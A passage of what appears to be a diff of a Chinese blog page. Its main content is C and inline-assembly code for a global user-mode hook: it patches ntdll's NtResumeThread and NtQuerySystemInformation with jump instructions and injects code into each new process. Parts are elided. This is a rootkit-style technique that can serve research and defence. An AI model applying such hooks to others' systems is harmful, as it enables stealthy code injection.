class="hljs-number">0</span>);<br><br>&#125;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtResumeThread</span><span class="hljs-params">(IN HANDLE ThreadHandle,</span><br><span class="hljs-params">OUT PULONG PreviousSuspendCount OPTIONAL)</span><br>&#123;<br><br>    NTSTATUS ret;<br>    NTSTATUS nStatus;<br>    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;<br>    NTQUERYINFORMATIONTHREAD NtQueryInformationThread = <span class="hljs-literal">NULL</span>;<br>    THREAD_BASIC_INFORMATION ti;<br>    DWORD Pid = <span class="hljs-number">0</span>;<br><br>    HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br>    NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,<br>                                                             <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br>    NtQueryInformationThread = (NTQUERYINFORMATIONTHREAD)GetProcAddress(hNtdll,<br>                                                             <span class="hljs-string">&quot;NtQueryInformationThread&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (NtQueryInformationThread == <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;can&#x27;t get NtQueryInformationThread&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    &#125;<br><br>    nStatus = NtQueryInformationThread(ThreadHandle,<br>                                           ThreadBasicInformation,<br>                                           (PVOID)&amp;ti,<br>                       <span class="hljs-keyword">sizeof</span>(THREAD_BASIC_INFORMATION),<br>                                           <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span>(nStatus != STATUS_SUCCESS)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;fuck failed&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    &#125;<br><br>    Pid = (DWORD)(ti.ClientId.UniqueProcess);<br><br>    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, Pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _DEBUG</span><br>        MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;open process failed&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, MB_OK);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br><br>    BYTE FirstByte[<span class="hljs-number">1</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-comment">// check if the process has been hooked</span><br>    ReadProcessMemory(hProcess, NtQuerySystemInformation, FirstByte, <span class="hljs-number">1</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 已经被Hook了</span><br>    <span class="hljs-keyword">if</span> ( FirstByte[<span class="hljs-number">0</span>] == <span class="hljs-number">0xe9</span>)<br>    &#123;<br><br>       HookOff();<br>       ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);<br>       HookOn();<br><br>       CloseHandle(hProcess);<br><br>       <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>    <span class="hljs-comment">// 创建新进程的调用，Hook 之</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        HookOff();<br>        inject(hProcess);<br>        ret = g_pfNtResumeThread(ThreadHandle, PreviousSuspendCount);<br>        HookOn();<br><br>        CloseHandle(hProcess);<br>        <span class="hljs-keyword">return</span> ret;<br>    &#125;<br>&#125;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">NewNtQuerySystemInformation</span><span class="hljs-params">(</span><br><span class="hljs-params">            IN ULONG SystemInformationClass,</span><br><span class="hljs-params">            IN PVOID SystemInformation,</span><br><span class="hljs-params">            IN ULONG SystemInformationLength,</span><br><span class="hljs-params">            OUT PULONG ReturnLength)</span><br>&#123;<br>    NTSTATUS ntStatus;<br><br>    HookOff();<br>    ntStatus = g_pfNtQuerySystemInformation(SystemInformationClass,<br>                                                SystemInformation,<br>                                                SystemInformationLength,<br>                                                ReturnLength);<br>    HookOn();<br><br>   <span class="hljs-keyword">return</span> ntStatus;<br>&#125;<br><br><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOn</span><span class="hljs-params">()</span><br>&#123;<br>    PMEMORY_BASIC_INFORMATION lpAllocBuffer = <span class="hljs-literal">NULL</span>;<br>    DWORD dwOldProtect, dwOldProtect2;<br>    HANDLE hProcess = <span class="hljs-literal">NULL</span>;<br><br>    <br>    dwIdOld = GetCurrentProcessId();<br>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, dwIdOld);<br>    <span class="hljs-keyword">if</span>(hProcess == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> ;<br><br>     HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>     g_pfNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll,<br>                                                    <span class="hljs-string">&quot;NtQuerySystemInformation&quot;</span>);<br><br>     <span class="hljs-keyword">if</span> (g_pfNtQuerySystemInformation == <span class="hljs-literal">NULL</span>)<br>     &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br><br>     g_pfNtResumeThread = (NTRESUMETHREAD)GetProcAddress(hNtdll, <span class="hljs-string">&quot;NtResumeThread&quot;</span>);<br><br>     <span class="hljs-keyword">if</span> (g_pfNtResumeThread == <span class="hljs-literal">NULL</span>)<br>     &#123;<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br><br>     EnterCriticalSection(&amp;cs);<br><br>    _asm<br>    &#123;<br>        lea edi,g_OldNtQuerySystemInformation<br>        mov esi,g_pfNtQuerySystemInformation<br>        cld<br>        mov ecx,<span class="hljs-number">5</span><br>        rep movsb<br>        lea edi,g_OldNtResumeThread<br>        mov esi,g_pfNtResumeThread<br>        cld<br>        mov ecx,<span class="hljs-number">5</span><br>        rep movsb<br>    &#125;<br><br>    g_NewNtQuerySystemInformation[<span class="hljs-number">0</span>] = <span class="hljs-number">0xe9</span>;<br>    g_NewNtResumeThread[<span class="hljs-number">0</span>] = <span class="hljs-number">0xe9</span>;<br>    _asm<br>    &#123;<br>        lea eax, NewNtQuerySystemInformation<br>        mov ebx, g_pfNtQuerySystemInformation<br>        sub eax, ebx<br>        sub eax, <span class="hljs-number">5</span><br>        mov dword ptr [g_NewNtQuerySystemInformation + <span class="hljs-number">1</span>], eax<br>        lea eax, NewNtResumeThread<br>        mov ebx, g_pfNtResumeThread<br>        sub eax, ebx<br>        sub eax, <span class="hljs-number">5</span><br>        mov dword ptr [g_NewNtResumeThread + <span class="hljs-number">1</span>], eax<br>    &#125;<br>    .......<br>    LeaveCriticalSection(&amp;cs);<br><br>    g_bHook = TRUE;<br>&#125;<br><br><span class="hljs-comment">// 还原被修改的代码</span><br><span class="hljs-type">void</span> WINAPI <span class="hljs-title function_">HookOff</span><span class="hljs-params">()</span><br>&#123;<br>    ......<br>    g_bHook = FALSE;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <h2 id="4-参考资料"><a href="#4-参考资料" class="headerlink" title="4. 参考资料"></a>4. 参考资料</h2><p>Microsoft MSDN，SDK &amp; DDK<br>《Windows NT 2000 Native API Reference》<br>《Windows 核心编程》<br>《挂钩Windows API》<br>《如何在Windows NT中隐藏自己》</p>
 
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/windows/" class="print-no-link">#windows</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>挂钩 NtResumeThread 实现全局Hook</div>
+      <div>http://usmacd.com/cn/hook_ntResume/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>henices</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2008年5月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
   </div>
-</article>
 
 
 
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/cn/sqlserver2005_xpcmdshell/" title="SQL Server 2005 xp_cmdshell">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL Server 2005 xp_cmdshell</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/cn/int23_native_api/" title="int 2eh 方式调用Native api">
+                        <span class="hidden-mobile">int 2eh 方式调用Native api</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
 
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">首页</a></li>
-        
-          <li><a href="/about/">关于</a></li>
-        
-          <li><a href="/archives/">归档</a></li>
-        
-          <li><a href="/search/">搜索</a></li>
-        
-          <li><a href="/links/">链接</a></li>
-        
-          <li><a href="/rss.xml">RSS</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%A5%E5%BE%80%E7%9A%84Ring-3%E5%85%A8%E5%B1%80Hook"><span class="toc-number">1.</span> <span class="toc-text">1. 以往的Ring 3全局Hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B%E8%BF%87%E7%A8%8B%EF%BC%8C%E5%AF%BB%E6%89%BE%E6%96%B9%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">2. 分析系统创建进程过程，寻找方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B7%E4%BD%93%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">3. 具体代码实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">4.</span> <span class="toc-text">4. 参考资料</span></a></li></ol>
+            
+          </article>
+        </div>
       </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://usmacd.com/cn/hook_ntResume/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://usmacd.com/cn/hook_ntResume/&text=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://usmacd.com/cn/hook_ntResume/&is_video=false&description=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=挂钩 NtResumeThread 实现全局Hook&body=Check out this article: http://usmacd.com/cn/hook_ntResume/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://usmacd.com/cn/hook_ntResume/&title=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://usmacd.com/cn/hook_ntResume/&name=挂钩 NtResumeThread 实现全局Hook&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://usmacd.com/cn/hook_ntResume/&t=挂钩 NtResumeThread 实现全局Hook"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
     </div>
 
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
 
+
+
+  </aside>
+
+
+    </div>
   </div>
 </div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2004-2024
-    henices
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/search/">搜索</a></li><!--
-     --><!--
-       --><li><a href="/links/">链接</a></li><!--
-     --><!--
-       --><li><a href="/rss.xml">RSS</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
 
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
     </div>
-    <!-- styles -->
+  </div>
+</div>
 
+    
 
+    
+  </main>
 
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
+  <footer>
+    <div class="footer-inner">
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
   
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
     })
-  })
   </script>
 
 
-<script src="/js/main.js"></script>
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
 
-<!-- search -->
 
-<!-- Baidu Analytics -->
 
-<!-- Cloudflare Analytics -->
 
-<!-- Disqus Comments -->
 
-<!-- utterances Comments -->
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
